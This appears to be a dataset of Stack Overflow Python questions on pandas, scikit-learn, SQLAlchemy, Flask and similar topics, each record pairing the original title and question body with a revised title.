Is parsing a json naively into a Python class or recordtype secure?," Some background first: I have a few rather simple data structures which are persisted as json files on disk. These json files are shared between applications of different languages and different environments (like web frontend and data manipulation tools). For each of the files I want to create a Python ""POPO"" (Plain Old Python Object), and a corresponding data mapper class for each item should implement some simple CRUD like behavior (e.g. save will serialize the class and store as json file on disk). I think a simple mapper (which only knows about basic types) will work. However, I'm concerned about security. Some of the json files will be generated by a web frontend, so a possible security risk if a user feeds me some bad json.Finally, here is the simple mapping code (found at How to convert JSON data into a Python object): What possible security issues do you see?NB: I'm new to Python. Edit: Thanks all for your comments. I've found out that I have one json where I have 2 arrays, each having a map. Unfortunately this starts to look like it gets cumbersome when I get more of these. I'm extending the question to mapping a json input to a recordtype. The original code is from here: https://stackoverflow.com/a/15882054/1708349.Since I need mutable objects, I'd change it to use a namedlist instead of a namedtuple: Is it still safe? <code>  class User(object):def __init__(self, name, username): self.name = name self.username = usernameimport jsonj = json.loads(your_json)u = User(**j) import jsonfrom namedlist import namedlistdata = '{""name"": ""John Smith"", ""hometown"": {""name"": ""New York"", ""id"": 123}}'# Parse JSON into an object with attributes corresponding to dict keys.x = json.loads(data, object_hook=lambda d: namedlist('X', d.keys())(*d.values()))print x.name, x.hometown.name, x.hometown.id",Is parsing a json naively into a Python class or struct secure?
changing values of a list of namedtuples," I have a list of namedtuples named Books and am trying to increase the price field by 20% which does change the value of Books. I tried to do: But I keep getting : I understand that I cannot set the fields in a namedtuple. How do I go about updating price?I tried to make it into a function: but I get an error with replace saying: Can someone let me know why this is happening? <code>  from collections import namedtupleBook = namedtuple('Book', 'author title genre year price instock')BSI = [ Book('Suzane Collins','The Hunger Games', 'Fiction', 2008, 6.96, 20), Book('J.K. Rowling', ""Harry Potter and the Sorcerer's Stone"", 'Fantasy', 1997, 4.78, 12)]for item in BSI: item = item.price*1.10print(item.price) Traceback (most recent call last): print(item.price) AttributeError: 'float' object has no attribute 'price' def restaurant_change_price(rest, newprice): rest.price = rest._replace(price = rest.price + newprice) return rest.priceprint(restaurant_change_price(Restaurant(""Taillevent"", ""French"", ""343-3434"", ""Escargots"", 24.50), 25)) rest.price = rest._replace(price = rest.price + newprice) AttributeError: can't set attribute",Changing values of a list of namedtuples
Scikit-learn Change Scoring Function in RandomForest," I'm trying to predict a binary variable with both random forests and logistic regression. I've got heavily unbalanced classes (approx 1.5% of Y=1).The default feature importance techniques in random forests are based on classification accuracy (error rate) - which has been shown to be a bad measure for unbalanced classes (see here and here). The two standard VIMs for feature selection with RF are the Gini VIM and the permutation VIM. Roughly speaking the Gini VIM of a predictor of interest is the sum over the forest of the decreases of Gini impurity generated by this predictor whenever it was selected for splitting, scaled by the number of trees. My question is : is that kind of method implemented in scikit-learn (like it is in the R package party) ? Or maybe a workaround ?PS : This question is kind of linked with an other. <code> ",AUC-base Features Importance using Random Forest
"Using SQLAlchemy and pymysql, how can I set the connection to utilize utf8mb8?"," I discovered (the hard way) that MySQL's UTF8 character set is only 3 bytes. A bit of research shows I can fix this by changing the tables to utilize the utf8mb4 collation and get the full 4 bytes UTF should be.I've done so. My database, tables and columns have all been ALTERed to utilize this charset. However, I still receive this message if I have data that has unicode code points larger than U+FFFF: I discovered I have the following settings: The collation_server was set by making changes to my.cnf. My question, is how do I change the connection one? I currently connect to the database using SQL Alchemy and pymysql like this: What can I do to change from utf8_general_ci to utf8mb4_general_ci when connecting via SQL Alchemy? <code>  Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation '='"" > show variables like '%collation%';collation_connection utf8_general_cicollation_database utf8mb4_general_cicollation_server utf8mb4_general_ci connect_string = 'mysql+pymysql://{}:{}@{}:{}/{}?charset=utf8'.format(DB_USER, DB_PASS, DB_HOST, DB_PORT, DATABASE)engine = create_engine(connect_string, convert_unicode=True, echo=False)session = sessionmaker()session.configure(bind=engine)","Using SQLAlchemy and pymysql, how can I set the connection to utilize utf8mb4?"
How to replace 'None' only with empty string using pandas?," the code below generates a df: I would like to replace all None (real None in python, not str) inside with ''(empty string).The expected df is what I did isdf = df.replace([None], [''], regex=True)But I got all the dates becomes big numbersEven NaT and NaN are replaced, which I don't want.How can I achieve that correctly and efficently? <code>  import pandas as pdfrom datetime import datetime as dtimport numpy as npdates = [dt(2014, 1, 2, 2), dt(2014, 1, 2, 3), dt(2014, 1, 2, 4), None]strings1 = ['A', 'B',None, 'C']strings2 = [None, 'B','C', 'C']strings3 = ['A', 'B','C', None]vals = [1.,2.,np.nan, 4.]df = pd.DataFrame(dict(zip(['A','B','C','D','E'], [strings1, dates, strings2, strings3, vals])))+---+------+---------------------+------+------+-----+| | A | B | C | D | E |+---+------+---------------------+------+------+-----+| 0 | A | 2014-01-02 02:00:00 | None | A | 1 || 1 | B | 2014-01-02 03:00:00 | B | B | 2 || 2 | None | 2014-01-02 04:00:00 | C | C | NaN || 3 | C | NaT | C | None | 4 |+---+------+---------------------+------+------+-----+ +---+---+---------------------+---+---+-----+| | A | B | C | D | E |+---+---+---------------------+---+---+-----+| 0 | A | 2014-01-02 02:00:00 | | A | 1 || 1 | B | 2014-01-02 03:00:00 | B | B | 2 || 2 | | 2014-01-02 04:00:00 | C | C | NaN || 3 | C | NaT | C | | 4 |+---+---+---------------------+---+---+-----+ +---+---+---------------------+---+------+---+| | A | B | C | D | E |+---+---+---------------------+---+------+---+| 0 | A | 1388628000000000000 | | A | 1 || 1 | B | 1388631600000000000 | B | B | 2 || 2 | | 1388635200000000000 | C | C | || 3 | C | | C | | 4 |+---+---+---------------------+---+------+---+",How to replace None only with empty string using pandas?
sklearn classifier get ValueError: bad input shape," I have a csv, struct isCAT1,CAT2,TITLE,URL,CONTENT, CAT1, CAT2, TITLE ,CONTENT are in chinese.I want train LinearSVC or MultinomialNB with X(TITLE) and feature(CAT1,CAT2), both get this error. below is my code:PS: I write below code through this example scikit-learn text_analytics error: <code>  import numpy as npimport csvfrom sklearn.feature_extraction.text import TfidfVectorizerfrom sklearn.svm import LinearSVCfrom sklearn.pipeline import Pipelinelabel_list = []def label_map_target(label): ''' map chinese feature name to integer ''' try: idx = label_list.index(label) except ValueError: idx = len(label_list) label_list.append(label) return idxc1_list = []c2_list = []title_list = []with open(csv_file, 'r') as f: # row_from_csv is for shorting this example for row in row_from_csv(f): c1_list.append(label_map_target(row[0]) c2_list.append(label_map_target(row[1]) title_list.append(row[2])data = np.array(title_list)target = np.array([c1_list, c2_list])print target.shape# (2, 4405)target = target.reshape(4405,2)print target.shape# (4405, 2)docs_train, docs_test, y_train, y_test = train_test_split( data, target, test_size=0.25, random_state=None)# vect = TfidfVectorizer(tokenizer=jieba_tokenizer, min_df=3, max_df=0.95)# use custom chinese tokenizer get same errorvect = TfidfVectorizer(min_df=3, max_df=0.95)docs_train= vect.fit_transform(docs_train)clf = LinearSVC()clf.fit(docs_train, y_train) ---------------------------------------------------------------------------ValueError Traceback (most recent call last)<ipython-input-24-904eb9af02cd> in <module>() 1 clf = LinearSVC()----> 2 clf.fit(docs_train, y_train)C:\Python27\lib\site-packages\sklearn\svm\classes.pyc in fit(self, X, y) 198 199 X, y = check_X_y(X, y, accept_sparse='csr',--> 200 dtype=np.float64, order=""C"") 201 self.classes_ = np.unique(y) 202 C:\Python27\lib\site-packages\sklearn\utils\validation.pyc in check_X_y(X, y, accept_sparse, dtype, order, copy, force_all_finite, ensure_2d, allow_nd, multi_output, ensure_min_samples, ensure_min_features, y_numeric) 447 dtype=None) 448 else:--> 449 y = column_or_1d(y, warn=True) 450 _assert_all_finite(y) 451 if y_numeric and y.dtype.kind == 'O':C:\Python27\lib\site-packages\sklearn\utils\validation.pyc in column_or_1d(y, warn) 483 return np.ravel(y) 484 --> 485 raise ValueError(""bad input shape {0}"".format(shape)) 486 487 ValueError: bad input shape (3303, 2)",sklearn classifier get ValueError: bad input shape
[solved]sklearn classifier get ValueError: bad input shape," I have a csv, struct isCAT1,CAT2,TITLE,URL,CONTENT, CAT1, CAT2, TITLE ,CONTENT are in chinese.I want train LinearSVC or MultinomialNB with X(TITLE) and feature(CAT1,CAT2), both get this error. below is my code:PS: I write below code through this example scikit-learn text_analytics error: <code>  import numpy as npimport csvfrom sklearn.feature_extraction.text import TfidfVectorizerfrom sklearn.svm import LinearSVCfrom sklearn.pipeline import Pipelinelabel_list = []def label_map_target(label): ''' map chinese feature name to integer ''' try: idx = label_list.index(label) except ValueError: idx = len(label_list) label_list.append(label) return idxc1_list = []c2_list = []title_list = []with open(csv_file, 'r') as f: # row_from_csv is for shorting this example for row in row_from_csv(f): c1_list.append(label_map_target(row[0]) c2_list.append(label_map_target(row[1]) title_list.append(row[2])data = np.array(title_list)target = np.array([c1_list, c2_list])print target.shape# (2, 4405)target = target.reshape(4405,2)print target.shape# (4405, 2)docs_train, docs_test, y_train, y_test = train_test_split( data, target, test_size=0.25, random_state=None)# vect = TfidfVectorizer(tokenizer=jieba_tokenizer, min_df=3, max_df=0.95)# use custom chinese tokenizer get same errorvect = TfidfVectorizer(min_df=3, max_df=0.95)docs_train= vect.fit_transform(docs_train)clf = LinearSVC()clf.fit(docs_train, y_train) ---------------------------------------------------------------------------ValueError Traceback (most recent call last)<ipython-input-24-904eb9af02cd> in <module>() 1 clf = LinearSVC()----> 2 clf.fit(docs_train, y_train)C:\Python27\lib\site-packages\sklearn\svm\classes.pyc in fit(self, X, y) 198 199 X, y = check_X_y(X, y, accept_sparse='csr',--> 200 dtype=np.float64, order=""C"") 201 self.classes_ = np.unique(y) 202 C:\Python27\lib\site-packages\sklearn\utils\validation.pyc in check_X_y(X, y, accept_sparse, dtype, order, copy, force_all_finite, ensure_2d, allow_nd, multi_output, ensure_min_samples, ensure_min_features, y_numeric) 447 dtype=None) 448 else:--> 449 y = column_or_1d(y, warn=True) 450 _assert_all_finite(y) 451 if y_numeric and y.dtype.kind == 'O':C:\Python27\lib\site-packages\sklearn\utils\validation.pyc in column_or_1d(y, warn) 483 return np.ravel(y) 484 --> 485 raise ValueError(""bad input shape {0}"".format(shape)) 486 487 ValueError: bad input shape (3303, 2)",sklearn classifier get ValueError: bad input shape
Run a program in background and redirect their outputs to file in real time," I want to run several python scripts simultaneously in one bash session and to inspect their outputs respectively in real time. To fulfil this task, I wrote a simple bash script which is shown below: When I use cat 1.output command to check what have been printed in the middle of executing, however, nothing can be seen.After thinking a while, I realise that the 1.output must be filled when 1.py finishes executing. In other words, the method which I used here is not a real time fashion.You may propse that to wait for these python scripts' finish. The fact, unfortunately, is that all there python scripts are actually long run programs, they maybe finish after days or months, and that is why I want to inspect their outputs in real time.Also, you may suggest me to modify the python scripts to print message to file directly instead of stdout. Sorry, the scripts here are too complex to modify, there are chucks of print function in them.what can I do now? <code>  #!/bin/bashpython 1.py > 1.output &python 2.py > 2.output &python 3.py > 3.output &",Run programs in background and redirect their outputs to file in real time
"How to send send an image to a tempate with flask-restful, jinja2 and google app engine"," I have a model with an image stored as a binary blob. I want to display this image, along with other data about the object, in a template. Since the image is not a separate file, I can't figure out how to display it. I've tried setting headers, or using send_file or render_template, but I either don't get the image or only get the image and not the rest of the template. How can I display a binary blob as an image in a template? <code>  class A(ndb.Model): id= ndb.IntegerProperty() x= ndb.StringProperty() y= ndb.StringProperty() image = ndb.BlobProperty()",Display image stored as binary blob in template
Compiled Python binary has wrong version," I tried to compile Python 2.7 from source. Here are my commands: And the output of which python is /my/local/dir/bin/python, which is correct.But when I ran python --version I see Python 2.7.3 instead of Python 2.7.10.The system version of Python is 2.7.3. Could it be the system version of Python somehow links itself against the local, compiled version? Or am I doing something wrong?Edit:The output of ./my/local/dir/bin/python --version is also Python 2.7.3Edit 2:Seems like if I get rid of the --enable-shared flag it will produce the correct version of Python, but I need that flag for my other software to work. <code>  ./configure --prefix=/my/local/dir --exec-prefix=/my/local/dir --enable-shared --with-pydebugmakemake install",Compiled Python binary reports wrong version
"Get U, Sigma, VT from Truncated SVD in scikit-learn"," I am using truncated SVD from scikit-learnpackage.In the definition of SVD, an original matrix A is approxmated as a product A UV* where U and V have orthonormal columns, and is non-negative diagonal.I need to get the U, and V* matrices. Looking at the source code here I found out that V* is stored in self.components_ field after calling fit_transform.Is it possible to get Uand matrices?My code:  <code>  import sklearn.decomposition as skdimport numpy as npmatrix = np.random.random((20,20))trsvd = skd.TruncatedSVD(n_components=15)transformed = trsvd.fit_transform(matrix)VT = trsvd.components_","Get U, Sigma, V* matrix from Truncated SVD in scikit-learn"
"Get U, , V* from Truncated SVD in scikit-learn"," I am using truncated SVD from scikit-learnpackage.In the definition of SVD, an original matrix A is approxmated as a product A UV* where U and V have orthonormal columns, and is non-negative diagonal.I need to get the U, and V* matrices. Looking at the source code here I found out that V* is stored in self.components_ field after calling fit_transform.Is it possible to get Uand matrices?My code:  <code>  import sklearn.decomposition as skdimport numpy as npmatrix = np.random.random((20,20))trsvd = skd.TruncatedSVD(n_components=15)transformed = trsvd.fit_transform(matrix)VT = trsvd.components_","Get U, Sigma, V* matrix from Truncated SVD in scikit-learn"
pandas: float_format and decimal sign not working on index column," BackgroundI am doing some simulations resp. a system analysis by variing parameters (in this case rpm only) and append every last line of a results dataframe results_df to a summarizing dataframe df containing giving the baviour of my system in depencence of the varied rpm.In order to get an appropriate index for plotting and data analysis I converted the varied values (here rpm) from the list into a pandas series ser and concat this series with the summarizing dataframe df containing the results I am interested in.Since the results of each calculation I am interested in is only last line of each calculation I am extracting this data from the results dataframe results_df by using .tail(1).What I have done so far is shown in the following snippet: ProblemThis csv-file what I get has the follwing format: However, I expected having three decimal digits and a comma as decimal sign on my index column, like shown here: So it seems that the index and decimal sign options are not applied to the index column when exporting dataframes to csv-files using the .to_csv command.How could I achieve this behaviour since the index option is set True and all values (with exception to the index column) have the right format and decimal sign?Do I have to handle the index column somehow seperate? <code>  rpm = [0.25, 0.3, 0.5, 0.75, 1.0, 1.5, 2.0]ser = pd.Series(rpm, name='rpm')df = pd.DataFrame()df_list = list()for i, val in enumerate(rpm): results_df = get_some_data_from_somwhere() df_list.append(results_df.tail(1))df = df.append(df_list, ignore_index=True)df = pd.concat([df, ser], axis=1)df.set_index('rpm', inplace=True)with open('foo.csv', 'w') as f: data.to_csv(f, index=True, header=True, decimal=',', sep=' ', float_format='%.3f') rpm cooling_inner heating_inner cooling_outlet heating_outlet0.25 303,317 323,372 302,384 324,332 rpm cooling_inner heating_inner cooling_outlet heating_outlet0,250 303,317 323,372 302,384 324,332",pandas to_csv arguments float_format and decimal not working for index column
Django reset_sequences doesn't work," I've updated django from 1.6 to 1.8.3. I create test models in test setUp method in unit tests, something like that And I have code in the application, which relies on the primary key == 1. I've noted, that sequences aren't actually reseted. In each next test the pk is greater, that in previous. This works ok in django 1.6, but after migration to 1.8 problems appears.Should I reset sequence manually?P.s. I know about fixtures, but my models are more complicated and for me it's easier to create models in the code. <code>  class MyTestCase(LiveServerTestCase): reset_sequences = True def setUp(self): self.my_model = models.MyModel.objects.create(name='test)",Django reset_sequences doesn't work in LiveServerTestCase
Python: Select the first file in a directory," I'm trying to process some files in a directory without knowing their name, and one by one.So I've used os.listdir(path) to list files.So I have to list files at each call of my function. The problem is when there is a lot of files (like 2000), it takes a loooooong time to list each file and I just want the first one.Is there any solution to get the first name without listing each files ? <code> ",How to select the first file in a directory?
Why is `pandas.read_csv` not the reciprocal of `df.to_csv`?," It seems strange to me that pandas.read_csv is not a direct reciprocal function to df.to_csv. In this illustration, notice how when using all the default settings the original and final DataFrames differ by the ""Unnamed"" column. It seems the default read_csv should instead be or the default to_csv should instead be which when read gives [4 rows x 3 columns](Perhaps this should instead be sent to the developer/s but I am genuinely interested why this is the default behavior. Hopefully it also can help someone else avoid the confusion I had). <code>  In [1]: import pandas as pdIn [2]: orig_df = pd.DataFrame({'AAA' : [4,5,6,7], 'BBB' : [10,20,30,40],'CCC' : [100,50,-30,-50]}); orig_dfOut[2]: AAA BBB CCC0 4 10 1001 5 20 502 6 30 -303 7 40 -50[4 rows x 3 columns]In [3]: orig_df.to_csv('test.csv')In [4]: final_df = pd.read_csv('test.csv'); final_dfOut[4]: Unnamed: 0 AAA BBB CCC0 0 4 10 1001 1 5 20 502 2 6 30 -303 3 7 40 -50[4 rows x 4 columns] In [6]: final2_df = pd.read_csv('test.csv', index_col=0); final2_dfOut[7]: AAA BBB CCC0 4 10 1001 5 20 502 6 30 -303 7 40 -50[4 rows x 3 columns] In [8]: df.to_csv('test2.csv', index=False) In [9]: pd.read_csv('test2.csv')Out[9]: AAA BBB CCC0 4 10 1001 5 20 502 6 30 -303 7 40 -50",Why is `pandas.read_csv` not the reciprocal of `pandas.DataFrame.to_csv`?
Python & Pandas: unable to drop duplicate when the column contains nested json," I read data from json, and some of them are duplicates so I want to drop them, please note that there are 2 column(douban_info and omdb_info) are still in json/dict formatHowever, if I do pd_data.drop_duplicates(['douban_info']) (the column with json content), it would fail.But if I do pd_data.drop_duplicates(['detail_url']) (a regular column), it would work.So how can I drop these duplicates successfully??The Exception: Notes: where can I put the data file? so you can try it out? <code>  TypeError Traceback (most recent call last)<ipython-input-13-a0091f87b553> in <module>() 1 pd_data.drop_duplicates(['detail_url']) # this works----> 2 pd_data.drop_duplicates(['douban_info']) # this failed 3 # pd_data2.describe()...TypeError: unhashable type: 'dict'",Drop duplicate row with dicts
How can I open Website in python?," I want to open a website in my local computer's web browser (Chrome or Internet Explorer) using Python. Is there a module that can do this for me? <code>  open(""http://google.co.kr"") # something like this ",How can I open a website in my web browser using Python?
How can I open Website in my Web Browser using python?," I want to open a website in my local computer's web browser (Chrome or Internet Explorer) using Python. Is there a module that can do this for me? <code>  open(""http://google.co.kr"") # something like this ",How can I open a website in my web browser using Python?
How to get the number of variables in a SymPy expression," I am trying to get the number of symbols in a SymPy expression like: The number for instance should be 3. All I came up with so far is However, this counts also the constant factors 1/4 and 1/2.Any Ideas? <code>  a = sympify('1/4*x+y+c+1/2') a.args.__len__()",How to get the number of symbols in a SymPy expression
python function in html file (flask-sqlalchemy)," Is there a way to call a Python function inside a Jinja template? The function will just take the string years and turn it into a list. How can I call this on years in the template below? <code>  years = years.replace('[', '')years = years.replace(']', '')years = years.split(',') {% extends ""base.html"" %}{% import ""_macros.html"" as macros %}{% block title %}Year Results{% endblock %}{% block page_content %}<div class=""page-header""> <h1>Year Search Results</h1></div><ul class=entries> {% for entry in entries %} <li><h3><a href=""{{ url_for('main.grantinfo', applid=entry.appl_id) }}"">{{ entry.appl_id }} : {{ entry.project_title }}</a></h3> <br> {% else %} <li><em>No entry here</em> {% endfor %}</ul>{% if pagination %}<div class=""pagination""> {{ macros.pagination_widget(pagination, '.yearresults', years=years) }}</div>{% endif %}{% endblock %}",Call a Python function from a Jinja template
How to add percentages on top of bars in seaborn?," Given the following count plot how do I place percentages on top of the bars? For example for ""First"" I want total First men/total First, total First women/total First, and total First children/total First on top of their respective bars. <code>  import seaborn as snssns.set(style=""darkgrid"")titanic = sns.load_dataset(""titanic"")ax = sns.countplot(x=""class"", hue=""who"", data=titanic)",How to add percentages on top of bars in seaborn
How to add percentages on top of bars in seaborn," Given the following count plot how do I place percentages on top of the bars? For example for ""First"" I want total First men/total First, total First women/total First, and total First children/total First on top of their respective bars. <code>  import seaborn as snssns.set(style=""darkgrid"")titanic = sns.load_dataset(""titanic"")ax = sns.countplot(x=""class"", hue=""who"", data=titanic)",How to add percentages on top of bars in seaborn
How to add percentages on top of bars in seaborn / matplotlib," Given the following count plot how do I place percentages on top of the bars? For example for ""First"" I want total First men/total First, total First women/total First, and total First children/total First on top of their respective bars. <code>  import seaborn as snssns.set(style=""darkgrid"")titanic = sns.load_dataset(""titanic"")ax = sns.countplot(x=""class"", hue=""who"", data=titanic)",How to add percentages on top of bars in seaborn
Pands DataFrame.merge MemoryError," GoalMy goal is to merge two DataFrames by their common column (gene names) so I can take a product of each gene score across each gene row. I'd then perform a groupby on patients and cells and sum all scores from each. The ultimate data frame should look like this: That last part should work fine, but I have not been able to perform the first merge on gene names due to a MemoryError. Below are snippets of each DataFrame.Datacell_s = cell_s is about 10,000,000 rowspatient_s = patient_s is about 1,200,000 rowsCode I was getting a MemoryError when initially read_csving these files, but then specifying the dtypes resolved the issue. Confirming that my python is 64 bit did not fix my issue either. I haven't reached the limitations on pandas, have I?Python 3.4.3 |Anaconda 2.3.0 (64-bit)| Pandas 0.16.2 <code>  patient cell Pat_1 22RV1 12 DU145 15 LN18 9 Pat_2 22RV1 12 DU145 15 LN18 9 Pat_3 22RV1 12 DU145 15 LN18 9 Description Name level_2 00 LOC100009676 100009676_at LN18_CENTRAL_NERVOUS_SYSTEM 11 LOC100009676 100009676_at 22RV1_PROSTATE 22 LOC100009676 100009676_at DU145_PROSTATE 33 AKT3 10000_at LN18_CENTRAL_NERVOUS_SYSTEM 44 AKT3 10000_at 22RV1_PROSTATE 55 AKT3 10000_at DU145_PROSTATE 66 MED6 10001_at LN18_CENTRAL_NERVOUS_SYSTEM 77 MED6 10001_at 22RV1_PROSTATE 88 MED6 10001_at DU145_PROSTATE 9 id level_1 00 MED6 Pat_1 11 MED6 Pat_2 12 MED6 Pat_3 13 LOC100009676 Pat_1 24 LOC100009676 Pat_2 25 LOC100009676 Pat_3 26 ABCD Pat_1 37 ABCD Pat_2 38 ABCD Pat_3 3 .... def get_score(cell, patient): cell_s = cell.set_index(['Description', 'Name']).stack().reset_index() cell_s.columns = ['Description', 'Name', 'cell', 's1'] patient_s = patient.set_index('id').stack().reset_index() patient_s.columns = ['id', 'patient', 's2'] # fails here: merged = cell_s.merge(patient_s, left_on='Description', right_on='id') merged['score'] = merged.s1 * merged.s2 scores = merged.groupby(['patient','cell'])['score'].sum() return scores",Pandas DataFrame.merge MemoryError
Python cache with time to live, I have multiple threads running the same process that need to be able to to notify each other that something should not be worked on for the next n seconds its not the end of the world if they do however.My aim is to be able to pass a string and a TTL to the cache and be able to fetch all the strings that are in the cache as a list. The cache can live in memory and the TTL's will be no more than 20 seconds.Does anyone have a any suggestions for how this can be accomplished? <code> ,Python in-memory cache with time to live
Pyhton csv.DictReader. Handle csv file with duplicate fieldnames," I am working with a poorly-formed CSV file; it has duplicate fieldnames. csv.DictReader just overwrites the first column with the same name with the contents of the second column with the same name. But I need both contents of columns with duplicate name.I can't assign the DictReader.fieldnames parameter directly. There are about one hundred columns and every time it would be different number of columns, e.g.: output: {'product':'car', 'price1': 200, 'price2':300}I need: {'product':'car', 'price1': 100, 'price2':300, 'price3': 200}What is the way to do it? <code>  product, price1, price2, price1,...,price100car, 100, 300, 200,...,350",How to handle csv file with duplicate fieldnames when reading with csv.DictReader?
Python 2.7: round number to nearest integer," I've been trying to round long float numbers like: With no success so far. I tried math.ceil(x), math.floor(x) (although that would round up or down, which is not what I'm looking for) and round(x) which didn't work either (still float numbers).What could I do?Code: <code>  32.268907563;32.268907563;31.2396694215;33.6206896552;... for i in widthRange: for j in heightRange: r, g, b = rgb_im.getpixel((i, j)) h, s, v = colorsys.rgb_to_hsv(r/255.0, g/255.0, b/255.0) h = h * 360 int(round(h)) print(h)",Round number to nearest integer
How to plot stacked event duration using Python Pandas," I have a Pandas DataFrame containing the date that a stream gage started measuring flow and the date that the station was decommissioned. I want to generate a plot showing these dates graphically. Here is a sample of my DataFrame: I want to create a plot similar to this (please note that I did not make this plot using the above data):The plot does not have to have the text shown along each line, just the y-axis with station names.While this may seem like a niche application of pandas, I know several scientists that would benefit from this plotting ability.The closest answer I could find is here:How to plot stacked proportional graph?How to plot two columns of a pandas data frame using points?Matplotlib timelinesCreate Gantt Plot with python matplotlibThe last answer is closest to suiting my needs.While I would prefer a way to do it through the Pandas wrapper, I would be open and grateful to a straight matplotlib solution. <code>  import pandas as pddata = {'index': [40623, 40637, 40666, 40697, 40728, 40735, 40742, 40773, 40796, 40819, 40823, 40845, 40867, 40887, 40945, 40964, 40990, 41040, 41091, 41100], 'StationId': ['UTAHDWQ-5932100', 'UTAHDWQ-5932230', 'UTAHDWQ-5932240', 'UTAHDWQ-5932250', 'UTAHDWQ-5932253', 'UTAHDWQ-5932254', 'UTAHDWQ-5932280', 'UTAHDWQ-5932290', 'UTAHDWQ-5932750', 'UTAHDWQ-5983753', 'UTAHDWQ-5983754', 'UTAHDWQ-5983755', 'UTAHDWQ-5983756', 'UTAHDWQ-5983757', 'UTAHDWQ-5983759', 'UTAHDWQ-5983760', 'UTAHDWQ-5983775', 'UTAHDWQ-5989066', 'UTAHDWQ-5996780', 'UTAHDWQ-5996800'], 'amin': ['1994-07-19 13:15:00', '2006-03-16 13:55:00', '1980-10-31 16:00:00', '1981-06-11 17:45:00', '2006-06-28 13:15:00', '2006-06-28 13:55:00', '1981-06-11 15:30:00', '1992-06-10 15:45:00', '2005-10-03 16:30:00', '2006-04-25 09:56:00', '2006-04-25 11:05:00', '2006-04-25 13:50:00', '2006-04-25 14:20:00', '2006-04-25 12:45:00', '2008-04-08 13:03:00', '2008-04-08 13:15:00', '2008-04-15 12:47:00', '2005-10-04 10:15:00', '1995-03-09 13:59:00', '1995-03-09 15:13:00'], 'amax': ['1998-06-30 14:51:00', '2007-01-24 12:55:00', '2007-07-31 11:35:00', '1990-08-01 08:30:00', '2007-01-24 13:35:00', '2007-01-24 14:05:00', '2006-08-22 16:00:00', '1998-06-30 11:33:00', '2005-10-22 15:00:00', '2006-04-25 10:00:00', '2008-04-08 12:16:00', '2008-04-08 09:10:00', '2008-04-08 09:30:00', '2008-04-08 11:27:00', '2008-04-08 13:05:00', '2008-04-08 13:23:00', '2009-04-07 13:15:00', '2005-10-05 11:40:00', '1996-03-14 10:40:00', '1996-03-14 11:05:00']}df = pd.DataFrame(data)df.set_index('index', inplace=True)# display(df.head()) StationId amin amaxindex 40623 UTAHDWQ-5932100 1994-07-19 13:15:00 1998-06-30 14:51:0040637 UTAHDWQ-5932230 2006-03-16 13:55:00 2007-01-24 12:55:0040666 UTAHDWQ-5932240 1980-10-31 16:00:00 2007-07-31 11:35:0040697 UTAHDWQ-5932250 1981-06-11 17:45:00 1990-08-01 08:30:0040728 UTAHDWQ-5932253 2006-06-28 13:15:00 2007-01-24 13:35:00",How to plot stacked event duration (Gantt Charts) using Python Pandas
How to plot stacked event duration (Gantt Charts) using Python Pandas?," I have a Pandas DataFrame containing the date that a stream gage started measuring flow and the date that the station was decommissioned. I want to generate a plot showing these dates graphically. Here is a sample of my DataFrame: I want to create a plot similar to this (please note that I did not make this plot using the above data):The plot does not have to have the text shown along each line, just the y-axis with station names.While this may seem like a niche application of pandas, I know several scientists that would benefit from this plotting ability.The closest answer I could find is here:How to plot stacked proportional graph?How to plot two columns of a pandas data frame using points?Matplotlib timelinesCreate Gantt Plot with python matplotlibThe last answer is closest to suiting my needs.While I would prefer a way to do it through the Pandas wrapper, I would be open and grateful to a straight matplotlib solution. <code>  import pandas as pddata = {'index': [40623, 40637, 40666, 40697, 40728, 40735, 40742, 40773, 40796, 40819, 40823, 40845, 40867, 40887, 40945, 40964, 40990, 41040, 41091, 41100], 'StationId': ['UTAHDWQ-5932100', 'UTAHDWQ-5932230', 'UTAHDWQ-5932240', 'UTAHDWQ-5932250', 'UTAHDWQ-5932253', 'UTAHDWQ-5932254', 'UTAHDWQ-5932280', 'UTAHDWQ-5932290', 'UTAHDWQ-5932750', 'UTAHDWQ-5983753', 'UTAHDWQ-5983754', 'UTAHDWQ-5983755', 'UTAHDWQ-5983756', 'UTAHDWQ-5983757', 'UTAHDWQ-5983759', 'UTAHDWQ-5983760', 'UTAHDWQ-5983775', 'UTAHDWQ-5989066', 'UTAHDWQ-5996780', 'UTAHDWQ-5996800'], 'amin': ['1994-07-19 13:15:00', '2006-03-16 13:55:00', '1980-10-31 16:00:00', '1981-06-11 17:45:00', '2006-06-28 13:15:00', '2006-06-28 13:55:00', '1981-06-11 15:30:00', '1992-06-10 15:45:00', '2005-10-03 16:30:00', '2006-04-25 09:56:00', '2006-04-25 11:05:00', '2006-04-25 13:50:00', '2006-04-25 14:20:00', '2006-04-25 12:45:00', '2008-04-08 13:03:00', '2008-04-08 13:15:00', '2008-04-15 12:47:00', '2005-10-04 10:15:00', '1995-03-09 13:59:00', '1995-03-09 15:13:00'], 'amax': ['1998-06-30 14:51:00', '2007-01-24 12:55:00', '2007-07-31 11:35:00', '1990-08-01 08:30:00', '2007-01-24 13:35:00', '2007-01-24 14:05:00', '2006-08-22 16:00:00', '1998-06-30 11:33:00', '2005-10-22 15:00:00', '2006-04-25 10:00:00', '2008-04-08 12:16:00', '2008-04-08 09:10:00', '2008-04-08 09:30:00', '2008-04-08 11:27:00', '2008-04-08 13:05:00', '2008-04-08 13:23:00', '2009-04-07 13:15:00', '2005-10-05 11:40:00', '1996-03-14 10:40:00', '1996-03-14 11:05:00']}df = pd.DataFrame(data)df.set_index('index', inplace=True)# display(df.head()) StationId amin amaxindex 40623 UTAHDWQ-5932100 1994-07-19 13:15:00 1998-06-30 14:51:0040637 UTAHDWQ-5932230 2006-03-16 13:55:00 2007-01-24 12:55:0040666 UTAHDWQ-5932240 1980-10-31 16:00:00 2007-07-31 11:35:0040697 UTAHDWQ-5932250 1981-06-11 17:45:00 1990-08-01 08:30:0040728 UTAHDWQ-5932253 2006-06-28 13:15:00 2007-01-24 13:35:00",How to plot stacked event duration (Gantt Charts) using Python Pandas
